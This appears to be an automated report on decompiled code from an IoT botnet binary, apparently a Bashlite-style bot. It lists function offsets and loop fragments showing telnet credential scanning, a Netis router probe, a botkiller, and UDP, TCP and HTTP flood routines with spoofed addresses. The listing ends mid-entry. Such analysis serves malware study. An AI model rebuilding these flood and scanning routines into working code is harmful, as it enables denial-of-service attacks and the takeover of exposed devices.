=================FUNCTION : __GI_inet_ntoa_r ===================
++++++++ FUNCTION START 33716
++++++++ FUNCTION END 33839
++++++++ FUNCTION LENGTH 123
    while (true) {
=================FUNCTION : __GI___uClibc_fini ===================
++++++++ FUNCTION START 44378
++++++++ FUNCTION END 44506
++++++++ FUNCTION LENGTH 128
    while (true) {
=================FUNCTION : fgets ===================
++++++++ FUNCTION START 28765
++++++++ FUNCTION END 28893
++++++++ FUNCTION LENGTH 128
    int32_t result = __GI_fgets_unlocked((char *)a1, a2, a3); // r4
=================FUNCTION : makeIPPacket ===================
++++++++ FUNCTION START 10151
++++++++ FUNCTION END 10252
++++++++ FUNCTION LENGTH 101
    return rand_cmwc();
=================FUNCTION : __GI_gethostbyname2 ===================
++++++++ FUNCTION START 34163
++++++++ FUNCTION END 34268
++++++++ FUNCTION LENGTH 105
    gethostbyname2_r(v100, v101, (int32_t *)((int32_t)&v99 + 0x6760), (int32_t)&v99 + 0x65a8, 440, v98, v97);
=================FUNCTION : __GI_inet_ntoa ===================
++++++++ FUNCTION START 33842
++++++++ FUNCTION END 33951
++++++++ FUNCTION LENGTH 109
    int32_t result = __GI_inet_ntoa_r(); // 0x14a7c
=================FUNCTION : __GI_gethostbyname ===================
++++++++ FUNCTION START 34060
++++++++ FUNCTION END 34160
++++++++ FUNCTION LENGTH 100
    return __GI_gethostbyname2();
=================FUNCTION : inet_pton4 ===================
++++++++ FUNCTION START 63266
++++++++ FUNCTION END 63437
++++++++ FUNCTION LENGTH 171
    while (true) {
=================FUNCTION : skip_and_NUL_space ===================
++++++++ FUNCTION START 65643
++++++++ FUNCTION END 65783
++++++++ FUNCTION LENGTH 140
    while (true) {
=================FUNCTION : __GI_time ===================
++++++++ FUNCTION START 20709
++++++++ FUNCTION END 20818
++++++++ FUNCTION LENGTH 109
    gettimeofday((int32_t)&v98, 0);
=================FUNCTION : __GI_strcasecmp ===================
++++++++ FUNCTION START 32548
++++++++ FUNCTION END 32686
++++++++ FUNCTION LENGTH 138
    while (true) {
=================FUNCTION : inet_addr ===================
++++++++ FUNCTION START 33954
++++++++ FUNCTION END 34057
++++++++ FUNCTION LENGTH 103
    int32_t v100 = inet_aton((char *)v98, (int32_t)&v99); // 0x14a8c
=================FUNCTION : getdtablesize ===================
++++++++ FUNCTION START 21491
++++++++ FUNCTION END 21592
++++++++ FUNCTION LENGTH 101
    return getrlimit(7, (int32_t)&v98) < 0 ? 256 : v98;
=================FUNCTION : __open_etc_hosts ===================
++++++++ FUNCTION START 67874
++++++++ FUNCTION END 67974
++++++++ FUNCTION LENGTH 100
    return __GI_config_open((int32_t)&v97 - 1204);
=================FUNCTION : get_telstate_host ===================
++++++++ FUNCTION START 7024
++++++++ FUNCTION END 7125
++++++++ FUNCTION LENGTH 101
    return __GI_inet_ntoa(v98);
=================FUNCTION : __check_one_fd ===================
++++++++ FUNCTION START 44509
++++++++ FUNCTION END 44618
++++++++ FUNCTION LENGTH 109
        int32_t v98 = __GI_open((int32_t)&v97 - 2236, a2); // 0x17474
=================FUNCTION : GetRandomIP ===================
++++++++ FUNCTION START 9782
++++++++ FUNCTION END 9883
++++++++ FUNCTION LENGTH 101
    return rand_cmwc() & -1 - a1 ^ v98 & a1;
=================FUNCTION : getHost ===================
++++++++ FUNCTION START 6165
++++++++ FUNCTION END 6266
++++++++ FUNCTION LENGTH 101
    int32_t v98 = inet_addr(a1); // 0x95a0
=================FUNCTION : zprintf ===================
++++++++ FUNCTION START 4856
++++++++ FUNCTION END 4956
++++++++ FUNCTION LENGTH 100
    return print(NULL, a1, (int32_t)&v98);
=================FUNCTION : random ===================
++++++++ FUNCTION START 40900
++++++++ FUNCTION END 41009
++++++++ FUNCTION LENGTH 109
    __GI_random_r((int32_t *)(v98 + 1276), (int32_t)&result);
=================FUNCTION : fd_to_DIR ===================
++++++++ FUNCTION START 48790
++++++++ FUNCTION END 48919
++++++++ FUNCTION LENGTH 129
        free();
=================FUNCTION : __GI_config_open ===================
++++++++ FUNCTION START 50153
++++++++ FUNCTION END 50267
++++++++ FUNCTION LENGTH 114
    if (__GI_fopen(v98, (int32_t)&v97 - 2268) == 0) {
=================FUNCTION : szprintf ===================
++++++++ FUNCTION START 4959
++++++++ FUNCTION END 5058
++++++++ FUNCTION LENGTH 99
    return print(&a1, a2, (int32_t)&a3);
=================FUNCTION : inet_ntop4 ===================
++++++++ FUNCTION START 63852
++++++++ FUNCTION END 64002
++++++++ FUNCTION LENGTH 150
    while (true) {
=================FUNCTION : __get_hosts_byname_r ===================
++++++++ FUNCTION START 66302
++++++++ FUNCTION END 66402
++++++++ FUNCTION LENGTH 100
    return __read_etc_hosts_r();
=================FUNCTION : tcpcsum ===================
++++++++ FUNCTION START 10042
++++++++ FUNCTION END 10148
++++++++ FUNCTION LENGTH 106
    free();
=================FUNCTION : __GI_raise ===================
++++++++ FUNCTION START 35282
++++++++ FUNCTION END 35382
++++++++ FUNCTION LENGTH 100
    return kill(__GI_getpid(), a1);
=================FUNCTION : __GI__exit ===================
++++++++ FUNCTION START 22382
++++++++ FUNCTION END 22493
++++++++ FUNCTION LENGTH 111
    while (true) {
=================FUNCTION : fdgets ===================
++++++++ FUNCTION START 5741
++++++++ FUNCTION END 5866
++++++++ FUNCTION LENGTH 125
    while (true) {
=================FUNCTION : __getdents64 ===================
++++++++ FUNCTION START 61766
++++++++ FUNCTION END 61929
++++++++ FUNCTION LENGTH 163
    while (true) {
=================FUNCTION : advance_state ===================
++++++++ FUNCTION START 7365
++++++++ FUNCTION END 7472
++++++++ FUNCTION LENGTH 107
        __GI_close(*a1);
=================FUNCTION : sprintf ===================
++++++++ FUNCTION START 23413
++++++++ FUNCTION END 23513
++++++++ FUNCTION LENGTH 100
    return __GI_vsnprintf();
=================FUNCTION : _stdio_openlist_dec_use ===================
++++++++ FUNCTION START 29247
++++++++ FUNCTION END 29425
++++++++ FUNCTION LENGTH 178
            while (true) {
=================FUNCTION : read_with_timeout ===================
++++++++ FUNCTION START 7240
++++++++ FUNCTION END 7362
++++++++ FUNCTION LENGTH 122
        result = __libc_recv(a1, a3, a4, 0, (int32_t)&v103);
=================FUNCTION : __GI_fopen ===================
++++++++ FUNCTION START 23310
++++++++ FUNCTION END 23410
++++++++ FUNCTION LENGTH 100
    return _stdio_fopen();
=================FUNCTION : __GI_vsnprintf ===================
++++++++ FUNCTION START 23516
++++++++ FUNCTION END 23648
++++++++ FUNCTION LENGTH 132
    int32_t result = _vfprintf_internal(v99, (char *)v106, v107); // 0x1247c
=================FUNCTION : __decode_dotted ===================
++++++++ FUNCTION START 64459
++++++++ FUNCTION END 64673
++++++++ FUNCTION LENGTH 214
                while (true) {
=================FUNCTION : _ppfs_init ===================
++++++++ FUNCTION START 26814
++++++++ FUNCTION END 26974
++++++++ FUNCTION LENGTH 160
        while (true) {
=================FUNCTION : _charpad ===================
++++++++ FUNCTION START 25614
++++++++ FUNCTION END 25739
++++++++ FUNCTION LENGTH 125
    while (true) {
=================FUNCTION : __libc_waitpid ===================
++++++++ FUNCTION START 21048
++++++++ FUNCTION END 21150
++++++++ FUNCTION LENGTH 102
    return wait4(v98, v99);
=================FUNCTION : isatty ===================
++++++++ FUNCTION START 33077
++++++++ FUNCTION END 33186
++++++++ FUNCTION LENGTH 109
    uint32_t v98 = __GI_tcgetattr(); // 0x148e4
=================FUNCTION : __GI_strcoll ===================
++++++++ FUNCTION START 30806
++++++++ FUNCTION END 30930
++++++++ FUNCTION LENGTH 124
    while (true) {
=================FUNCTION : __encode_dotted ===================
++++++++ FUNCTION START 68334
++++++++ FUNCTION END 68549
++++++++ FUNCTION LENGTH 215
    while (true) {
=================FUNCTION : parseHex ===================
++++++++ FUNCTION START 5869
++++++++ FUNCTION END 5995
++++++++ FUNCTION LENGTH 126
    while (true) {
=================FUNCTION : makeRandomStr ===================
++++++++ FUNCTION START 6688
++++++++ FUNCTION END 6799
++++++++ FUNCTION LENGTH 111
            v98 = rand_cmwc();
================================================================================
========	WHILE LOOPS INTRESTING INSTRUCTIONS : =================================
================================================================================
=============================WHILE LOOPS ID : 1 @ trim ====================================
++++++++ WHILE START : 3560 
++++++++ WHILE FUNCTION : trim 
++++++++ WHILE END : 3592 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 3 @ prints ====================================
++++++++ WHILE START : 3841 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 3853 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)a1, v101);
=============================WHILE LOOPS ID : 4 @ prints ====================================
++++++++ WHILE START : 3984 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 3996 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)a1, v101);
=============================WHILE LOOPS ID : 5 @ prints ====================================
++++++++ WHILE START : 4134 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 4146 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)a1, v101);
=============================WHILE LOOPS ID : 7 @ print ====================================
++++++++ WHILE START : 4579 
++++++++ WHILE FUNCTION : print 
++++++++ WHILE END : 4845 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar(a1, (int32_t)*v101);
		while (true) {
		while (true) {
		int32_t v124 = prints(v98, v121, v112, v106, (int32_t)&v123); // 0x8a9c
		int32_t v126 = printi(v98, v125, 10, 1, v112, v106, 97) + result; // 0x8b0c
		int32_t v128 = printi(v98, v127, 16, 0, v112, v106, 97) + result; // 0x8b70
		int32_t v130 = printi(v98, v129, 16, 0, v112, v106, 65) + result; // 0x8bd4
		int32_t v133 = printi(v98, v132, 10, 0, v112, v106, 97) + result; // 0x8c38
		int32_t v136 = prints(v98, (char *)&v100, v112, v106, v134); // 0x8c8c
		printchar(a1, (int32_t)*v101);
=============================WHILE LOOPS ID : 8 @ fdpclose ====================================
++++++++ WHILE START : 5700 
++++++++ WHILE FUNCTION : fdpclose 
++++++++ WHILE END : 5726 
++++++++ INTRESTING INSTRUCTIONS :  
		v104 = __libc_waitpid(v105, (int32_t)&v103, 0);
		__GI_sigprocmask(2, v102, 0, v102);
=============================WHILE LOOPS ID : 11 @ getBogos ====================================
++++++++ WHILE START : 6493 
++++++++ WHILE FUNCTION : getBogos 
++++++++ WHILE END : 6557 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v100, 0x1000, v98, v100) == 0) {
		__GI_close(v98);
		uppercase((char *)&v99);
		if (strstr(v100, "BOGOMIPS") == v100) {
		while (true) {
		while (true) {
		__GI_close(v98);
=============================WHILE LOOPS ID : 12 @ getCores ====================================
++++++++ WHILE START : 6665 
++++++++ WHILE FUNCTION : getCores 
++++++++ WHILE END : 6684 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v99, 0x1000, v100, v99) == 0) {
		__GI_close(v100);
		uppercase((char *)&v98);
		if (strstr(v99, "BOGOMIPS") == v99) {
=============================WHILE LOOPS ID : 13 @ recvLine ====================================
++++++++ WHILE START : 6923 
++++++++ WHILE FUNCTION : recvLine 
++++++++ WHILE END : 6996 
++++++++ INTRESTING INSTRUCTIONS :  
		sockprintf(v105, (int32_t)"PING");
		while (true) {
		if (__libc_recv(v105, (int32_t)&v106, 1, 0, v109) != 1) {
=============================WHILE LOOPS ID : 14 @ recvLine ====================================
++++++++ WHILE START : 7003 
++++++++ WHILE FUNCTION : recvLine 
++++++++ WHILE END : 7014 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__libc_recv(v105, (int32_t)&v106, 1, 0, v109) == 1) {
=============================WHILE LOOPS ID : 15 @ contains_string ====================================
++++++++ WHILE START : 8001 
++++++++ WHILE FUNCTION : contains_string 
++++++++ WHILE END : 8016 
++++++++ INTRESTING INSTRUCTIONS :  
		if (strcasestr((char *)a1, v101, 4 * v100) != 0) {
=============================WHILE LOOPS ID : 16 @ listFork ====================================
++++++++ WHILE START : 8296 
++++++++ WHILE FUNCTION : listFork 
++++++++ WHILE END : 8316 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
=============================WHILE LOOPS ID : 17 @ matchPrompt ====================================
++++++++ WHILE START : 8600 
++++++++ WHILE FUNCTION : matchPrompt 
++++++++ WHILE END : 8662 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 18 @ readUntil ====================================
++++++++ WHILE START : 8773 
++++++++ WHILE FUNCTION : readUntil 
++++++++ WHILE END : 8853 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v104 = __libc_recv(a1, v103, 1, 0, v103); // 0xa9dc
		if (strstr(a6, (char *)a2) == 0) {
		int32_t v105 = __libc_recv(a1, v103 + 1, 2, 0, v101); // 0xaa44
=============================WHILE LOOPS ID : 20 @ StartTheLelz ====================================
++++++++ WHILE START : 10641 
++++++++ WHILE FUNCTION : StartTheLelz 
++++++++ WHILE END : 11155 
++++++++ INTRESTING INSTRUCTIONS :  
		case 0: {
		GetRandomPublicIP(24, v100, v112, v114);
		socket(2, 1, 0);
		if (__libc_connect(*v111, (int32_t)&v97, 16) == -1) {
		socket(2, 1, 0);
		case 1: {
		while (true) {
		getsockopt(*v120, 1, 4, (int32_t)&v125, v125);
		case 2: {
		case 3: {
		if (__libc_send(*v130, v131, len, 0x4000) < 0) {
		if (__libc_send(*v130, (int32_t)"\r\n", 2, 0x4000) < 0) {
		case 4: {
		case 5: {
		if (__libc_send(*v135, v136, len2, 0x4000) < 0) {
		if (__libc_send(*v135, (int32_t)"\r\n", 2, 0x4000) < 0) {
		case 6: {
		get_telstate_host(v105, v100, v106);
		sockprintf(v141, (int32_t)"LOGIN FOUND - %s:%s:%s");
		case 7: {
		__libc_send(*v142, (int32_t)"sh\r\n", 4, 0x4000);
		__libc_send(*v142, (int32_t)"shell\r\n", 7, 0x4000);
		if (__libc_send(*v142, str3, len3, 0x4000) < 0) {
=============================WHILE LOOPS ID : 23 @ sendSTD ====================================
++++++++ WHILE START : 11305 
++++++++ WHILE FUNCTION : sendSTD 
++++++++ WHILE END : 11328 
++++++++ INTRESTING INSTRUCTIONS :  
		rand();
		__libc_send(v98, v110, 65, 0);
		__libc_connect(v98, v101, 16);
		__GI_close(v98);
=============================WHILE LOOPS ID : 24 @ sendUDP ====================================
++++++++ WHILE START : 11465 
++++++++ WHILE FUNCTION : sendUDP 
++++++++ WHILE END : 11505 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		__libc_sendto(v101, v102, a5, 0, (int32_t)&v97, 16);
		rand_cmwc();
=============================WHILE LOOPS ID : 25 @ sendUDP ====================================
++++++++ WHILE START : 11567 
++++++++ WHILE FUNCTION : sendUDP 
++++++++ WHILE END : 11620 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		__libc_sendto(v108, v113, a5 + 28, 0, (int32_t)&v127, (int32_t)&v127);
		*v114 = (int16_t)rand_cmwc();
		v128 = rand_cmwc();
		*(int16_t *)(v113 | 4) = (int16_t)rand_cmwc();
		*(int32_t *)(v113 + 12) = __GI_htonl(GetRandomIP(v111));
=============================WHILE LOOPS ID : 26 @ sendTCP ====================================
++++++++ WHILE START : 11808 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 11892 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__GI_strcoll(v123, (int32_t)"rst") == 0) {
		if (__GI_strcoll(v123, (int32_t)"psh") == 0) {
		sockprintf(v99, (int32_t)"Invalid flag \"%s\"");
=============================WHILE LOOPS ID : 27 @ sendTCP ====================================
++++++++ WHILE START : 11916 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 11945 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v98, v104, v102, 0, (int32_t)&v118, (int32_t)&v118);
		v111 = GetRandomIP(v101);
		*(int16_t *)(v104 | 4) = (int16_t)rand_cmwc();
		*v108 = rand_cmwc();
		*v106 = (int16_t)rand_cmwc();
		*v116 = (int16_t)tcpcsum(v104, v105);
=============================WHILE LOOPS ID : 28 @ sendTCP ====================================
++++++++ WHILE START : 11971 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 11986 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v98, v104, v102, 0, (int32_t)&v118, (int32_t)&v118);
		v111 = GetRandomIP(v101);
		*(int16_t *)(v104 | 4) = (int16_t)rand_cmwc();
		*v108 = rand_cmwc();
		*v106 = (int16_t)rand_cmwc();
		*v116 = (int16_t)tcpcsum(v104, v105);
=============================WHILE LOOPS ID : 29 @ botkiller ====================================
++++++++ WHILE START : 12094 
++++++++ WHILE FUNCTION : botkiller 
++++++++ WHILE END : 12112 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_system(v98);
		__libc_system(v98);
=============================WHILE LOOPS ID : 30 @ NetisScanner ====================================
++++++++ WHILE START : 12218 
++++++++ WHILE FUNCTION : NetisScanner 
++++++++ WHILE END : 12228 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v101 = socket(2, 2, 17); // 0xf104
		NetisRanges();
		__libc_sendto(v101, (int32_t)"AAAAAAAAnetcore", strlen("AAAAAAAAnetcore"), 0, v100, 16);
		__libc_sendto(v101, (int32_t)"AA", strlen("AA"), 0, v100, 16);
		__GI_close(v101);
=============================WHILE LOOPS ID : 31 @ sendHTTP ====================================
++++++++ WHILE START : 12452 
++++++++ WHILE FUNCTION : sendHTTP 
++++++++ WHILE END : 12492 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__libc_fork() != 0) {
		while (true) {
		if (socket_connect(a1, a3) != 0) {
=============================WHILE LOOPS ID : 32 @ processCmd ====================================
++++++++ WHILE START : 13165 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 13182 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendTCP(v98, v121, v122, v123, v141, v100, v101);
=============================WHILE LOOPS ID : 34 @ processCmd ====================================
++++++++ WHILE START : 13266 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 13272 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 37 @ processCmd ====================================
++++++++ WHILE START : 13381 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 13432 
++++++++ INTRESTING INSTRUCTIONS :  
		sockprintf(v92, (int32_t)"None Killed.");
		sockprintf(v92, (int32_t)"Killed %d.");
		if (*v169 != __GI_getpid()) {
		kill(v171, 9);
=============================WHILE LOOPS ID : 38 @ processCmd ====================================
++++++++ WHILE START : 13451 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 13468 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendSTD(v155, v158, v159, 0);
=============================WHILE LOOPS ID : 42 @ processCmd ====================================
++++++++ WHILE START : 13556 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 13574 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendCNC(v148, v151, v152, 0);
		__GI_close(v92);
=============================WHILE LOOPS ID : 44 @ processCmd ====================================
++++++++ WHILE START : 13628 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 13634 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 48 @ processCmd ====================================
++++++++ WHILE START : 13747 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 13753 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 51 @ processCmd ====================================
++++++++ WHILE START : 13824 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 13843 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendHTTP(*v105, *(int32_t *)(v91 + 8), (int16_t)v174, v177, v175, atol(v176));
=============================WHILE LOOPS ID : 53 @ processCmd ====================================
++++++++ WHILE START : 13917 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 13923 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 56 @ processCmd ====================================
++++++++ WHILE START : 13982 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 13988 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 58 @ processCmd ====================================
++++++++ WHILE START : 14038 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14044 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 62 @ processCmd ====================================
++++++++ WHILE START : 14151 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14157 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 66 @ processCmd ====================================
++++++++ WHILE START : 14280 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14286 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 69 @ processCmd ====================================
++++++++ WHILE START : 14341 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14347 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 70 @ processCmd ====================================
++++++++ WHILE START : 14378 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14384 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 71 @ processCmd ====================================
++++++++ WHILE START : 14431 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14437 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 72 @ processCmd ====================================
++++++++ WHILE START : 14500 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14506 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 73 @ processCmd ====================================
++++++++ WHILE START : 14525 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14531 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 74 @ processCmd ====================================
++++++++ WHILE START : 14562 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14568 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 75 @ processCmd ====================================
++++++++ WHILE START : 14615 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14621 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 76 @ processCmd ====================================
++++++++ WHILE START : 14703 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14709 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 77 @ processCmd ====================================
++++++++ WHILE START : 14728 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14734 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 78 @ processCmd ====================================
++++++++ WHILE START : 14765 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14771 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 79 @ processCmd ====================================
++++++++ WHILE START : 14818 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14824 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 80 @ processCmd ====================================
++++++++ WHILE START : 14845 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14851 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 81 @ processCmd ====================================
++++++++ WHILE START : 14902 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14908 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 82 @ processCmd ====================================
++++++++ WHILE START : 14927 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14933 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 83 @ processCmd ====================================
++++++++ WHILE START : 14964 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14970 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 84 @ processCmd ====================================
++++++++ WHILE START : 15017 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15023 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 85 @ processCmd ====================================
++++++++ WHILE START : 15086 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15092 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 86 @ processCmd ====================================
++++++++ WHILE START : 15111 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15117 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 87 @ processCmd ====================================
++++++++ WHILE START : 15148 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15154 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 88 @ processCmd ====================================
++++++++ WHILE START : 15201 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15207 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 89 @ processCmd ====================================
++++++++ WHILE START : 15296 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15302 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 90 @ processCmd ====================================
++++++++ WHILE START : 15321 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15327 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 91 @ processCmd ====================================
++++++++ WHILE START : 15358 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15364 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 92 @ processCmd ====================================
++++++++ WHILE START : 15411 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15417 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 93 @ processCmd ====================================
++++++++ WHILE START : 15438 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15444 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 94 @ processCmd ====================================
++++++++ WHILE START : 15475 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15481 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 95 @ processCmd ====================================
++++++++ WHILE START : 15522 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15528 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 96 @ processCmd ====================================
++++++++ WHILE START : 15548 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15565 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendUDP(v99, v114, v115, v116, v117, v97, v103, v102);
=============================WHILE LOOPS ID : 97 @ processCmd ====================================
++++++++ WHILE START : 15654 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15660 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 98 @ processCmd ====================================
++++++++ WHILE START : 15709 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15715 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 99 @ processCmd ====================================
++++++++ WHILE START : 15734 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15740 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 100 @ processCmd ====================================
++++++++ WHILE START : 15771 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15777 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 101 @ processCmd ====================================
++++++++ WHILE START : 15818 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15824 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 102 @ processCmd ====================================
++++++++ WHILE START : 15891 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15897 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 103 @ processCmd ====================================
++++++++ WHILE START : 15916 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15922 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 104 @ processCmd ====================================
++++++++ WHILE START : 15953 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15959 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 105 @ processCmd ====================================
